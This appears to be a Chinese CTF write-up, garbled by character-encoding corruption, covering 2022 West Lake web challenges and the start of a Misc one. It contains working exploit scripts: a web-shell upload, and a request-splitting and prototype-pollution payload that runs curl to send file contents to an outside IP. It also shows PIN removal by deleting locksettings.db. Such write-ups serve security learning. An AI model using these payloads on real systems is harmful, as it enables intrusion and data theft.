<h2 id="æ‰­è½¬ä¹¾å¤"><a class="markdownIt-Anchor" href="#æ‰­è½¬ä¹¾å¤"></a> æ‰­è½¬ä¹¾å¤</h2>
<h3 id="é¢˜ç›®æè¿°"><a class="markdownIt-Anchor" href="#é¢˜ç›®æè¿°"></a> é¢˜ç›®æè¿°ï¼š</h3>
<p>åœ¨å®é™…äº§å“åœºæ™¯ä¸­å¸¸è§å­˜åœ¨å¤šç§ä¸­é—´ä»¶çš„æƒ…å†µï¼Œè¿™æ—¶å¦‚æœå­˜åœ¨æŸç§æ‹¦æˆªï¼Œå¯ä»¥åˆ©ç”¨æ¡†æ¶æˆ–è€…ä¸­é—´ä»¶å¯¹äºRFCæ ‡å‡†ä¸­å®ç°å·®å¼‚è¿›è¡Œç»•è¿‡ã€‚æ³¨æ„æŸ¥çœ‹80ç«¯å£æœåŠ¡</p>
<h3 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h3>
<p>è¿™é¢˜åšçš„å¾ˆç„å¹»ï¼Œä¸€å¼€å§‹ä»¥ä¸ºéœ€è¦ä»€ä¹ˆç‰¹æ®Šçš„ä¸Šä¼ å§¿åŠ¿ï¼Œä½†æ˜¯å…¨éƒ½<code>403 Forbidden</code>,ä»”ç»†å®¡äº†ä¸€ä¸‹é¢˜ï¼Œè€ƒç‚¹ä¼°è®¡å°±åœ¨ä¸­é—´ä»¶äº†ã€‚</p>
<p>ç®€å•è¯•æ¢äº†ä¸€ä¸‹ï¼Œå‘ç°</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203182455930.png" alt="æ‰­è½¬ä¹¾å¤01"></p>
<p>å‘ç°<code>multipart/form-data</code>è¢«banäº†ï¼Œæœ‰å¾ˆæ˜æ˜¾çš„æç¤ºçš„æ„æ€ï¼Œè¯•ç€å»æŸ¥é˜…çš„<code>multipart/form-data</code>ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼Œå°±æ‰¾åˆ°ä¸€ç¯‡è¿™æ ·çš„æ–‡ç« </p>
<p>åœ¨æ–‡ç« é‡Œå‘ç°äº†å¯¹äºJavaæ¥è¯´ï¼Œâ½€æŒå‚æ•°åçš„â¼¤â¼©å†™ä¸æ•æ„Ÿçš„å†™æ³•ã€‚è€ŒHTTPåè®®ä¸­çš„<code>Content-Type</code>å¤´éƒ¨ä¿¡æ¯æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥å¯ä»¥å¯¹<code>multipart/form-data</code>å¤§å°å†™bypass</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203203311993.png" alt="æ‰­è½¬ä¹¾å¤02"></p>
<h2 id="node-magical-login"><a class="markdownIt-Anchor" href="#node-magical-login"></a> Node Magical Login</h2>
<h3 id="é¢˜ç›®æè¿°-2"><a class="markdownIt-Anchor" href="#é¢˜ç›®æè¿°-2"></a> é¢˜ç›®æè¿°ï¼š</h3>
<p>ä¸€ä¸ªç®€å•çš„ç”¨nodejså†™çš„ç™»å½•ç«™ç‚¹ï¼ˆè²Œä¼¼æš—è—ç„æœºï¼‰</p>
<h3 id="è§£é¢˜è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-2"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h3>
<p>è¿™é¢˜ç»™äº†æºç ï¼Œ<strong>controller.js</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">LoginController(<span class="params">req</span>,<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const username = req.body.username</span><br><span class="line">        const password = req.body.password</span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span><span class="operator"> || </span>password !== <span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>random<span class="literal">()</span>.<span class="keyword">to</span><span class="constructor">String()</span>) &#123;</span><br><span class="line">            res.status(<span class="number">401</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).send(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.cookie(<span class="string">&quot;user&quot;</span>,SECRET_COOKIE)</span><br><span class="line">            res.redirect(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (__) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çŸ¥é“flag1çš„è·å–æ–¹æ³•å°±æ˜¯è®¿é—®/flag1ç›®å½•å¹¶æ„é€ ä¸€ä¸ªcookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203204849857.png" alt="Node Magical Login 01"></p>
<p>flag1:  DASCTF{873803822</p>
<p>åœ¨<strong>controller.js</strong>åŒæ ·çŸ¥é“äº†flag2çš„è·å–æ–¹æ³•</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="constructor">CheckController(<span class="params">req</span>,<span class="params">res</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.body.checkcode?req.body.checkcode:<span class="number">1234</span>;</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.length<span class="operator"> === </span><span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="keyword">to</span><span class="constructor">LowerCase()</span></span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.status(<span class="number">403</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (__) &#123;&#125;</span><br><span class="line">        res.status(<span class="number">200</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="keyword">to</span><span class="constructor">String()</span>.trim<span class="literal">()</span>&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.status(<span class="number">403</span>).<span class="keyword">type</span>(<span class="string">&quot;text/html&quot;</span>).json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªåˆ¤æ–­ï¼šä¸€ä¸ªæ˜¯checkcodeçš„é•¿åº¦å¼ºç­‰äº16ï¼›ä¸€ä¸ªæ˜¯åœ¨ç»è¿‡<code>toLowerCase()</code>å…¨è½¬æ¢ä¸ºå°å†™ä¹‹åè¦ä¸</p>
<p><code>aGr5AtSp55dRacer</code>ç›¸ç­‰ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨æ•°ç»„æ¥bypass</p>
<p>æ„å»ºcheckcode</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;checkcode&quot;</span>:[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;G&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;5&quot;</span>,</span><br><span class="line"><span class="string">&quot;d&quot;</span>,<span class="string">&quot;R&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;r&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<strong>main.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒGETç±»å‹è®¿é—®/flag2è¾“å…¥éªŒè¯ç æŠ“åŒ…åè¾“å…¥æ„é€ å¥½çš„checkcode</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213649385.png" alt="Node Magical Login 02"></p>
<p>è·å–åˆ°flag2ï¼š77244565647131723193036}</p>
<p>flagï¼šDASCTF{87380382277244565647131723193036}</p>
<hr>
<p>ä½†æ˜¯åœ¨æµ‹è¯•ä¸­å‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ•°ç»„bypassï¼Œæ»¡è¶³é•¿åº¦ä¸º16å³å¯</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;checkcode&quot;:[<span class="number">1,2,3,4</span>,<span class="number">5,6,7,8</span>,<span class="number">9,10,11,12</span>,<span class="number">13,14,15,16</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213905343.png" alt="Node Magical Login 03"></p>
<p>è¿™é‡Œåº”è¯¥æ˜¯å‡ºé¢˜äººæ²¡é™åˆ¶å¥½</p>
<h2 id="unusual-php"><a class="markdownIt-Anchor" href="#unusual-php"></a> unusual php</h2>
<h3 id="è§£é¢˜è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-3"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h3>
<p>è®¿é—®ç»™çš„é“¾æ¥å¯ä»¥è·å¾—éƒ¨åˆ†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;read&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;version&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°èƒ½å¤Ÿä¸Šä¼ è¿˜èƒ½è¯»æ–‡ä»¶</p>
<p>æˆ‘ä»¬è¿™é‡Œè¯»ä¸€ä¸‹/var/www/html/index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=read&amp;&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203234858467.png" alt="unusual php 01"></p>
<p>å‘ç°å­˜åœ¨ä¹±ç ï¼Œåº”è¯¥æ˜¯å†™äº†ä¸€ä¸ªæ‹“å±•åŠ è§£å¯†ï¼ŒæŸ¥çœ‹phpinfo()</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204010131847.png" alt="unusual php 02"></p>
<p>æ³¨æ„ç¼–å·ï¼š20190902</p>
<p>è¯»å–/proc/self/mapsï¼Œæœç´¢20190902</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012341032.png" alt="unusual php"></p>
<p>åˆ©ç”¨ä¼ªåè®®è¯»å–.soæ–‡ä»¶ï¼Œå¹¶ä¿å­˜ä¸º.soæ–‡ä»¶</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012907656.png" alt="usunual php 04"></p>
<p>å¯¹å…¶è¿›è¡Œåç¼–è¯‘ï¼Œæ‰¾åˆ°Rc4åŠ å¯†çš„å¯†é’¥â€œabcsdfadfjiweurâ€</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013112977.png" alt="usunual php 05"></p>
<p>å¯¹ä¸€å¼€å§‹æ‹¿åˆ°çš„index.phpè¿›è¡Œè§£å¯†éªŒè¯ä¸€ä¸‹</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013306754.png" alt="usunual php 06"></p>
<p>å¯†é’¥æ­£ç¡®</p>
<p>ç¼–å†™ä¸€å¥è¯æœ¨é©¬è¿›è¡ŒåŠ å¯†</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013605153.png" alt="usunual php 07"></p>
<p>å†™ä¸€ä¸ªä¸Šä¼ è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;</span></span><br><span class="line"></span><br><span class="line">data = base64.b64decode(<span class="string">&quot;473xeG4d+1FXOOiInKCA0rVEAkBL0stSocHDxQ==&quot;</span>)</span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;TWe1v3.php&#x27;</span>,data)&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">re_content = s.post(url=url,files=file)</span><br><span class="line"><span class="built_in">print</span>(re_content.text)</span><br></pre></td></tr></table></figure>
<p>èšå‰‘é“¾æ¥ï¼š</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014151419.png" alt="usunual php 08"></p>
<p>åŸæœ¬æ˜¯éœ€è¦ä½¿ç”¨chmodæ¥æå‡/flagæƒé™çš„ï¼Œä½†æ˜¯å¤ç°æ˜¯å…±äº«ç«¯å£ï¼Œåˆ«äººå·²ç»æå®Œæƒé™äº†ï¼Œç›´æ¥è¯»å–å°±å¥½</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014430184.png" alt="usunual php 09"></p>
<h2 id="real_ez_node"><a class="markdownIt-Anchor" href="#real_ez_node"></a> real_ez_node</h2>
<h3 id="è§£é¢˜è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-4"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h3>
<p>å®¡æºç ï¼š</p>
<p>NodeJS ä¸­ Unicode å­—ç¬¦æŸåå¯¼è‡´çš„ HTTP æ‹†åˆ†æ”»å‡»ã€‚ç„¶åå­˜åœ¨ç„¶åå­˜åœ¨safeobj.expendè¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼Œæ¥ç€åŸå‹é“¾æ±¡æŸ“æ‰“ejsã€‚<code>constructor.prototype.outputFunctionName</code>ç»•è¿‡é‚£ä¸ª<code>__proto__</code></p>
<p>å‚è€ƒ</p>
<p><a href="https://xz.aliyun.com/t/12053#toc-17%E5%92%8Chttps://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/12053#toc-17å’Œhttps://xz.aliyun.com/t/2894</a></p>
<p>æ„å»ºexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 168</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl 101.43.139.243:8081/`cat /f*|base64`&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(</span><br><span class="line">    <span class="string">&#x27;http://3000.endpoint-9552f7133e68401e95e14dbecd1ab348.m.ins.cloud.dasctf.com:81/curl?q=&#x27;</span> + urllib.parse.quote(</span><br><span class="line">        payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œexpï¼Œè‡ªå·±çš„vpså¼€å¯ç«¯å£ç›‘å¬</p>
<p><img src="/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204020134877.png" alt="image-20230204020134877"></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">/REFTQ<span class="number">1</span>RGezYzMzgzOTAz<span class="symbol">NjA4</span>OTQz<span class="symbol">NTkyMTQ4</span>MTIwMD<span class="name">g1</span>MjQyMjk<span class="number">1</span>fQo= <span class="comment">//base64è§£ç å°±è¡Œ</span></span><br><span class="line">DASCTF&#123;<span class="number">63383903608943592148120085242295</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> #Misc</h1>
<h2 id="æœºä½ å¤ªç¾"><a class="markdownIt-Anchor" href="#æœºä½ å¤ªç¾"></a> æœºä½ å¤ªç¾</h2>
<h3 id="è§£é¢˜è¿‡ç¨‹-5"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹-5"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h3>
<p>ä¿®æ”¹æ–‡ä»¶åç¼€åï¼Œ7zè§£å‹åï¼Œå¤œç¥æ¨¡æ‹Ÿå™¨å¯¼å…¥vmdk</p>
<p>åˆ é™¤pinå€¼</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/Zev_Fung/p/14192545.html">https://www.cnblogs.com/Zev_Fung/p/14192545.html</a></p>
<p>åˆ é™¤/data/system/locksettings.dbå³å¯</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm <span class="regexp">/data/</span>system/locksettings.db</span><br></pre></td></tr></table></figure>
<p>é‡å¯è¿›å…¥ï¼Œå‘ç°å®‰è£…æœ‰QQå’ŒSkred</p>
